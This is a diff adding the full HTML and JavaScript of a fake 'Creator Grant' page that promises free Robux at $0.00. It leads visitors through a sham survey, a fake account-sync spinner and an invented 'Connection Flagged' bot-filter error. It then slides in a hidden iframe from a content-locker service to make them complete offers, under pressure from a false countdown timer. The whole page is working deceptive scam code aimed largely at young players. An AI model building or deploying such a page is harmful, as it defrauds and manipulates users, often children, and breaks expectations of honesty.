@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Creator Grant Program | Community Rewards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=Poppins:wght@700&family=Roboto+Mono&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/framer-motion@10.16.4/dist/framer-motion.js"></script>
+    <style>
+    
+    body,html{
+        scroll-behavior: smooth;
+        
+    }
+
+        body {
+            background-color: #0F0F0F;
+            color: #FFFFFF;
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+        }
+        .heading-font { font-family: 'Poppins', sans-serif; }
+        .mono-font { font-family: 'Roboto Mono', monospace; }
+        
+        #clocker{
+            
+            height:100%;
+            width:100%;
+            position: fixed;
+            transition: top 0.4s ease-out;
+            top:100%;
+            z-index:999;
+            padding:0;
+            
+        }
+        #clocker iframe{
+            height: 100%;
+            width:100%;
+        }
+        nav div img{
+            height:30px;
+            width:30px;
+        }
+        .glass-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: all 0.3s ease;
+        }
+        .glass-card:hover {
+            border-color: #F64747;
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .reward-badge {
+            background: linear-gradient(90deg, #F64747 0%, #B91C1C 100%);
+        }
+
+        .shimmer {
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            background-size: 200% 100%;
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .modal-overlay {
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+        }
+    </style>
+</head>
+<body class="antialiased">
+<div id="clocker" class="bg-[#161616] border border-gray-800 p-8 rounded-2xl max-w-md w-full">
+    <iframe src="https://lockerpreview.com/cl/i/qnnk45?preview=1" frameborder="0"></iframe>
+</div>
+    <nav id="nav" class="p-6 flex justify-between items-center max-w-6xl mx-auto">
+        <div class="flex items-center space-x-2">
+          <img src="IMG_20251228_165324.png" alt="" />
+            <span class="heading-font text-xl tracking-tight">GavloGrant</span>
+        </div>
+        
+        <div class="flex items-center space-x-4 text-sm">
+            <div class="flex items-center space-x-2">
+                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+               
+            </div>
+            <div class="hidden md:block h-4 w-px bg-gray-700"></div>
+            <div class="text-gray-400">Ends In: <span id="timer" class="text-white font-bold">14:59</span></div>
+        </div>
+    </nav>
+
+    <header class="text-center pt-12 pb-8 px-4">
+        <div class="inline-block px-4 py-1 rounded-full border border-gray-800 text-xs font-semibold text-gray-400 mb-6 tracking-widest uppercase">
+            Official Developer Initiative 2026
+        </div>
+        <h1 class="heading-font text-4xl md:text-6xl mb-4 leading-tight">
+            Claim Your Seasonal <br> <span class="text-[#F64747]">Creator Grant</span>
+        </h1>
+        <p class="text-gray-400 max-w-lg mx-auto text-lg">
+            Supporting active players with direct resource distribution. Select your allocation below.
+        </p>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-12">
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6" id="package-grid">
+            <div class="glass-card p-8 rounded-2xl relative cursor-pointer group" onclick="startSurvey(800)">
+                <div class="absolute top-0 right-0 m-4 px-2 py-1 reward-badge text-[10px] font-bold rounded">LIMITED</div>
+                <div class="w-16 h-16 bg-yellow-500/20 rounded-full mb-6 mx-auto flex items-center justify-center">
+                    <div class="w-10 h-10 bg-yellow-500 rounded-full border-4 border-yellow-600 shadow-[0_0_15px_rgba(234,179,8,0.5)]"></div>
+                </div>
+                <h3 class="heading-font text-2xl text-center mb-4">800 Robux</h3>
+                <div class="flex flex-col items-center space-y-1">
+                    <span class="text-gray-500 line-through text-sm">$9.99</span>
+                    <span class="text-2xl font-bold text-green-500">$0.00</span>
+                    <span class="bg-green-500/10 text-green-500 text-[10px] px-2 py-1 rounded-md font-bold">100% OFF</span>
+                </div>
+                <button class="w-full mt-6 py-3 bg-white text-black font-bold rounded-lg group-hover:bg-[#F64747] group-hover:text-white transition-colors">Select Grant</button>
+            </div>
+
+            <div class="glass-card p-8 rounded-2xl relative cursor-pointer group ring-2 ring-[#F64747]" onclick="startSurvey(1700)">
+                <div class="absolute top-0 right-0 m-4 px-2 py-1 reward-badge text-[10px] font-bold rounded">MOST POPULAR</div>
+                <div class="w-16 h-16 bg-yellow-500/20 rounded-full mb-6 mx-auto flex items-center justify-center">
+                    <div class="w-10 h-10 bg-yellow-500 rounded-full border-4 border-yellow-600 shadow-[0_0_20px_rgba(234,179,8,0.8)]"></div>
+                </div>
+                <h3 class="heading-font text-2xl text-center mb-4">1,700 Robux</h3>
+                <div class="flex flex-col items-center space-y-1">
+                    <span class="text-gray-500 line-through text-sm">$19.99</span>
+                    <span class="text-2xl font-bold text-green-500">$0.00</span>
+                    <span class="bg-green-500/10 text-green-500 text-[10px] px-2 py-1 rounded-md font-bold">100% OFF</span>
+                </div>
+                <button class="w-full mt-6 py-3 bg-[#F64747] text-white font-bold rounded-lg">Select Grant</button>
+            </div>
+
+            <div class="glass-card p-8 rounded-2xl relative cursor-pointer group" onclick="startSurvey(4500)">
+                <h3 class="heading-font text-2xl text-center mb-4">4,500 Robux</h3>
+                <div class="flex flex-col items-center space-y-1">
+                    <span class="text-gray-500 line-through text-sm">$49.99</span>
+                    <span class="text-2xl font-bold text-green-500">$0.00</span>
+                    <span class="bg-green-500/10 text-green-500 text-[10px] px-2 py-1 rounded-md font-bold">100% OFF</span>
+                </div>
+                <button class="w-full mt-6 py-3 bg-white text-black font-bold rounded-lg group-hover:bg-[#F64747] group-hover:text-white transition-colors">Select Grant</button>
+            </div>
+
+            <div class="glass-card p-8 rounded-2xl relative cursor-pointer group" onclick="startSurvey(10000)">
+                <h3 class="heading-font text-2xl text-center mb-4">10,000 Robux</h3>
+                <div class="flex flex-col items-center space-y-1">
+                    <span class="text-gray-500 line-through text-sm">$99.99</span>
+                    <span class="text-2xl font-bold text-green-500">$0.00</span>
+                    <span class="bg-green-500/10 text-green-500 text-[10px] px-2 py-1 rounded-md font-bold">100% OFF</span>
+                </div>
+                <button class="w-full mt-6 py-3 bg-white text-black font-bold rounded-lg group-hover:bg-[#F64747] group-hover:text-white transition-colors">Select Grant</button>
+            </div>
+        </div>
+    </main>
+
+    <section id="survey-section" class="hidden max-w-2xl mx-auto px-6 py-12">
+        <div class="glass-card p-8 rounded-2xl border-[#F64747]/30">
+            <div class="w-full bg-gray-800 h-2 rounded-full mb-8">
+                <div id="progress-bar" class="bg-[#F64747] h-full rounded-full transition-all duration-500" style="width: 20%"></div>
+            </div>
+            <div id="question-container">
+                <h2 id="question-text" class="heading-font text-2xl mb-6">How long have you been playing?</h2>
+                <div id="options" class="space-y-4">
+                    </div>
+            </div>
+        </div>
+    </section>
+
+    <div id="error-modal" class="fixed inset-0 modal-overlay px-4">
+        <div class="bg-[#161616] border border-gray-800 p-8 rounded-2xl max-w-md w-full">
+            <div class="flex items-center space-x-3 mb-6">
+                <div class="w-12 h-12 bg-red-500/10 flex items-center justify-center rounded-full">
+                    <svg class="w-6 h-6 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                </div>
+                <h2 class="heading-font text-xl">Request Interrupted</h2>
+            </div>
+            <div class="mono-font text-sm bg-black p-4 rounded-lg border border-gray-800 mb-6 space-y-2">
+                <p class="text-gray-400">> System: Verification Required</p>
+                <p class="text-gray-400">> Code: 0x882-BOT_FILTER</p>
+                <p class="text-red-500">> Status: Connection Flagged</p>
+            </div>
+            <p class="text-gray-400 text-sm mb-8 leading-relaxed">
+                To maintain program integrity and prevent bot scraping, a manual security handshake is required. Please complete one system requirement to release your reward.
+            </p>
+            
+            <div class="bg-white/5 p-6 rounded-xl border border-[#F64747]/50 border-dashed mb-6">
+                <p class="text-center font-bold text-sm mb-4">FINAL STEP: INTEGRITY CHECK</p>
+                <button onclick="triggerLocker()" class="w-full py-4 bg-[#F64747] hover:bg-[#d43d3d] text-white font-bold rounded-lg shadow-lg shadow-red-500/20">
+                    Verify & Release Reward
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="mt-20 border-t border-gray-900 py-10 text-center text-gray-600 text-xs">
+        <p>© 2026 GavloGrant Initiative. This program is not affiliated with the Roblox Corporation.</p>
+        <p class="mt-2">Server Latency: 24ms | Distribution Node: US-EAST-1</p>
+    </footer>
+
+    <script>
+    
+    
+        const questions = [
+            { q: "How long have you been playing?", a: ["Less than 1 year", "1-3 years", "5+ years"] },
+            { q: "Which platform do you play on most?", a: ["Mobile", "PC", "Console"] },
+            { q: "How often do you customize your avatar?", a: ["Daily", "Weekly", "Rarely"] }
+        ];
+        
+        let currentStep = 0;
+
+        function startSurvey(amount) {
+            document.getElementById('package-grid').classList.add('hidden');
+            document.getElementById('survey-section').classList.remove('hidden');
+            document.querySelector("header").classList.add("hidden");
+            
+            showQuestion();
+        }
+
+        function showQuestion() {
+            if(currentStep >= questions.length) {
+                showProcessing();
+                return;
+            }
+            
+            const q = questions[currentStep];
+            document.getElementById('question-text').innerText = q.q;
+            const optionsDiv = document.getElementById('options');
+            optionsDiv.innerHTML = '';
+            
+            q.a.forEach(opt => {
+                const btn = document.createElement('button');
+                btn.className = "w-full text-left p-4 rounded-xl border border-gray-800 hover:border-[#F64747] hover:bg-[#F64747]/5 transition-all";
+                btn.innerText = opt;
+                btn.onclick = () => {
+                    currentStep++;
+                    document.getElementById('progress-bar').style.width = ((currentStep / questions.length) * 100) + "%";
+                    showQuestion();
+                };
+                optionsDiv.appendChild(btn);
+            });
+        }
+
+        function showProcessing() {
+            document.getElementById('question-container').innerHTML = `
+                <div class="text-center py-10">
+                    <div class="inline-block w-12 h-12 border-4 border-[#F64747] border-t-transparent rounded-full animate-spin mb-4"></div>
+                    <p class="heading-font text-xl">Syncing with Account API...</p>
+                    <p class="text-gray-500 text-sm mt-2">Allocating grant resources...</p>
+                </div>
+            `;
+            setTimeout(() => {
+                document.getElementById('error-modal').style.display = 'flex';
+            }, 3000);
+        }
+
+        function triggerLocker() {
+            var clocker = document.getElementById("clocker");
+    var header_height = document.getElementById("nav").offsetHeight;
+    clocker.style.top=header_height+"px";
+    window.scrollTo(0,0)
+        }
+        
+
+        // Timer Logic
+        let time = 899;
+        setInterval(() => {
+            const mins = Math.floor(time / 60);
+            const secs = time % 60;
+            document.getElementById('timer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+            if(time > 0) time--;
+        }, 1000);
+    </script>
+</body>
+</html>
